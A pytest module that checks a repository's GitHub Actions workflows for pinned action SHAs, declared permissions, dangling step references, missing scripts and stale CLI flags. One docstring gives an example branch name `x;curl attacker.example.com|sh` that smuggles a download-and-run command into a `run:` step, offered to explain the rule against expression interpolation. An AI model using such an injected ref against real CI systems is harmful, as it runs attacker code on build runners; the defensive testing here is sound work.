"""Contracts for GitHub workflows, most of which have never executed.

Three of this repository's five workflows have never run once: `pr-sentinel.yml` and
`recursive-hardening.yml` fire on `pull_request` and `autonomous-triage.yml` on `issues`,
and in the repository's whole history there have been zero pull requests and zero issues.
Every commit went straight to `main`, so `ci.yml` accumulated 83 runs and the other three
accumulated none.

That is the repository's own signature defect at the level of process: a gate that has
never fired is indistinguishable from one that passes. Workflow code is worse than most,
because nothing else reads it — no linter resolves `python tools/x.py --flag` against that
script's argparse, and `actionlint` checks syntax rather than whether the command means
anything. These tests are what reads it.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
import sys
from pathlib import Path
from typing import Any

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parent.parent
WORKFLOW_DIR = REPO_ROOT / ".github" / "workflows"
WORKFLOWS = sorted(WORKFLOW_DIR.glob("*.yml")) + sorted(WORKFLOW_DIR.glob("*.yaml"))

_SHA_PINNED = re.compile(r"^[^@]+@[0-9a-f]{40}$")
_EXPRESSION = re.compile(r"\$\{\{(.+?)\}\}", re.DOTALL)
_STEP_REF = re.compile(r"steps\.([A-Za-z0-9_-]+)\.outputs\.([A-Za-z0-9_-]+)")
_PY_INVOCATION = re.compile(r"\bpython3?\s+((?:tools|examples|benchmarks)/[^\s]+\.py)((?:\s+[^\s|>&;]+)*)")


def _load(path: Path) -> dict[str, Any]:
    """Parse one workflow document."""
    return yaml.safe_load(path.read_text(encoding="utf-8"))


def _steps(path: Path) -> list[tuple[str, dict[str, Any]]]:
    """Return every (job name, step) pair in one workflow."""
    document = _load(path)
    return [
        (job_name, step)
        for job_name, job in (document.get("jobs") or {}).items()
        for step in (job.get("steps") or [])
    ]


def test_at_least_one_workflow_is_present() -> None:
    """A suite that silently found no workflows would pass every test below vacuously."""
    assert len(WORKFLOWS) >= 5


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_action_is_pinned_to_a_commit_sha(path: Path) -> None:
    """A moving tag is a dependency that can change under a workflow nobody ever runs."""
    unpinned = [
        step["uses"]
        for _, step in _steps(path)
        if "uses" in step and not step["uses"].startswith("./") and not _SHA_PINNED.match(step["uses"])
    ]
    assert unpinned == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_workflow_declares_least_privilege_permissions(path: Path) -> None:
    """An undeclared `permissions` block inherits whatever the repository default is."""
    assert "permissions" in _load(path)


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_no_run_step_interpolates_a_workflow_expression(path: Path) -> None:
    """Expressions are substituted into `run:` before the shell parses it.

    Git permits `;`, `$`, `(`, `)`, `|` and backticks in a ref name, so a branch called
    `x;curl attacker.example.com|sh` turns `git diff origin/${{ github.base_ref }}` into
    two commands on the runner. `autonomous-triage.yml` already routes the issue body
    through `env:` with a comment explaining exactly this; the rule was applied to one
    workflow and not the other two, which is the shape a never-executed file accumulates.

    Values reach `run:` through `env:`, where they are passed to the process rather than
    pasted into its source. That is GitHub's own hardening guidance and it is mechanical,
    so it needs no per-expression judgement about which context is attacker-controlled.
    """
    offenders = [
        f"{step.get('name', '<unnamed>')}: {match.strip()}"
        for _, step in _steps(path)
        if isinstance(step.get("run"), str)
        for match in _EXPRESSION.findall(step["run"])
    ]
    assert offenders == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_script_a_workflow_runs_exists(path: Path) -> None:
    """A renamed script fails at minute three of a workflow, or never, if it never runs."""
    missing = [
        script
        for _, step in _steps(path)
        if isinstance(step.get("run"), str)
        for script, _ in _PY_INVOCATION.findall(step["run"])
        if not (REPO_ROOT / script).is_file()
    ]
    assert missing == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_referenced_step_id_exists_in_its_job(path: Path) -> None:
    """`steps.typo.outputs.x` evaluates to empty rather than failing, so a condition silently inverts."""
    document = _load(path)
    dangling: list[str] = []
    for job_name, job in (document.get("jobs") or {}).items():
        declared = {step["id"] for step in (job.get("steps") or []) if "id" in step}
        referenced = {ref for ref, _ in _STEP_REF.findall(yaml.safe_dump(job))}
        dangling += [f"{job_name}:{ref}" for ref in sorted(referenced - declared)]
    assert dangling == []


@pytest.mark.parametrize("path", WORKFLOWS, ids=lambda p: p.name)
def test_every_referenced_step_output_is_written_by_that_step(path: Path) -> None:
    """An output nobody writes is an empty string, and `if: ... > 0` on it is always false."""
    document = _load(path)
    unwritten: list[str] = []
    for job in (document.get("jobs") or {}).values():
        by_id = {step["id"]: step for step in (job.get("steps") or []) if "id" in step}
        for ref, name in _STEP_REF.findall(yaml.safe_dump(job)):
            step = by_id.get(ref)
            if step is not None and not _writes_output(step, name):
                unwritten.append(f"{ref}.{name}")
    assert sorted(set(unwritten)) == []


def _writes_output(step: dict[str, Any], name: str) -> bool:
    """Report whether a step actually produces the named output."""
    body = step.get("run") or ""
    script = (step.get("with") or {}).get("script", "")
    return f"{name}=" in body or f"setOutput('{name}'" in script or f'setOutput("{name}"' in script


def _cli_invocations() -> list[tuple[str, str, tuple[str, ...]]]:
    """Return every (workflow, script, argv) a `run:` step invokes against repository tooling."""
    found: list[tuple[str, str, tuple[str, ...]]] = []
    for path in WORKFLOWS:
        for _, step in _steps(path):
            body = step.get("run")
            if not isinstance(body, str):
                continue
            joined = body.replace("\\\n", " ")
            found += [
                (path.name, script, tuple(shlex.split(rest)))
                for script, rest in _PY_INVOCATION.findall(joined)
            ]
    return found


@pytest.mark.parametrize(
    "workflow,script,argv", _cli_invocations(), ids=lambda v: v if isinstance(v, str) else ""
)
def test_every_cli_contract_a_workflow_depends_on_still_exists(
    workflow: str, script: str, argv: tuple[str, ...]
) -> None:
    """Resolve each workflow's command line against the script's own argument parser.

    Nothing else does this. `actionlint` checks that the YAML and the shell are
    well-formed, not that `verify-hardening --diff-file --is-defect` is a command the tool
    accepts — so a renamed subcommand or a dropped flag is discovered when the workflow
    runs, which for three of these workflows has been never.
    """
    subcommand = [token for token in argv[:1] if not token.startswith("-")]
    flags = [token for token in argv if token.startswith("--")]
    help_text = _help(script, subcommand)
    missing = [flag for flag in flags if flag not in help_text]
    assert missing == [], f"{workflow}: {script} {' '.join(subcommand)} rejects {missing}"


def _help(script: str, subcommand: list[str]) -> str:
    """Return the help text for a script, or for one of its subcommands."""
    # Fixed argv built from this repository's own files; no shell, no external input.
    proc = subprocess.run(
        [sys.executable, script, *subcommand, "--help"],
        cwd=REPO_ROOT,
        capture_output=True,
        text=True,
        timeout=120,
        check=False,
        env=dict(os.environ, COLUMNS="200"),
    )
    assert proc.returncode == 0, f"{script} {' '.join(subcommand)} --help failed: {proc.stderr[:300]}"
    return proc.stdout
